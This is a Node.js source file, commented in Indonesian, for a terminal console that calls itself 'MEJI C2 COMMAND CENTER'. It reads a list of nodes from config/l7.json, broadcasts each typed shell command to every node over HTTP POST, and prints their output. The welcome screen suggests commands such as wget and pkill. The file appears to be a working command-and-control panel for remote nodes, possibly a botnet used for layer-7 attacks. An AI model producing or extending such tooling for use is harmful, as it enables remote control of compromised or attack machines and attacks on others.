const axios = require('axios');
const fs = require('fs');
const readline = require('readline');
require('colors');

// 1. Load Config dari config/l7.json
let servers = [];
const CONFIG_PATH = './config/l7.json';

function reloadConfig() {
    try {
        if (fs.existsSync(CONFIG_PATH)) {
            const configData = fs.readFileSync(CONFIG_PATH, 'utf8');
            servers = JSON.parse(configData);
        }
    } catch (err) {
        console.error(`[ERROR] Gagal membaca config: ${err.message}`.red);
    }
}

reloadConfig();

// 2. Setup Interface Terminal
const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout,
    prompt: 'MEJI-C2 > '.magenta.bold
});

// 3. Welcome Screen
process.stdout.write('\x1Bc'); // Clear console
console.log(`
 ${" MEJI C2 COMMAND CENTER ".bgMagenta.white.bold} ${" v1.0 ".bgWhite.black}
 ${"──────────────────────────────────────────────────".gray}
 ${"Nodes Loaded:".gray} ${String(servers.length).cyan}
 ${"Target File:".gray}  ${CONFIG_PATH.yellow}
 ${"Status:".gray}       ${"READY TO BROADCAST".green}
 ${"──────────────────────────────────────────────────".gray}
 ${"Tip:".dim} Gunakan perintah seperti 'wget', 'ls', atau 'pkill'
`.magenta);

rl.prompt();

// 4. Logic Command & Broadcast
rl.on('line', async (line) => {
    const input = line.trim();

    if (input.toLowerCase() === 'exit' || input.toLowerCase() === 'quit') {
        console.log('\nClosing Meji C2...'.yellow);
        process.exit(0);
    }

    if (!input) {
        rl.prompt();
        return;
    }


    const command = input;
    reloadConfig();

    console.log(`\n[${"BROADCAST".magenta}] Sending: ${command.white}`);
    console.log(`${"──────────────────────────────────────────────────".gray}`);

    // Eksekusi ke semua server secara paralel
    const promises = servers.map(async (server) => {
        try {
            const start = Date.now();
            const response = await axios.post(server.host + '/', 
                { command: command }, 
                { timeout: 30000 } // Timeout 30 detik untuk command berat
            );
            
            const duration = Date.now() - start;
            console.log(`[${server.name.green}] ${"✔".green} (${duration}ms)`);
            
            if (response.data && response.data.output) {
                // Tampilkan output (limit 500 karakter agar tidak memenuhi layar)
                const out = response.data.output.trim();
                console.log(`${out.length > 500 ? out.substring(0, 500) + '...' : out}`.gray);
            }
        } catch (err) {
            console.log(`[${server.name.red}] ${"✘".red} Failed: ${err.message}`);
        }
    });

    await Promise.all(promises);
    console.log(`${"──────────────────────────────────────────────────".gray}\n`);
    rl.prompt();

}).on('close', () => {
    console.log('\nMeji C2 Offline.'.red);
    process.exit(0);
});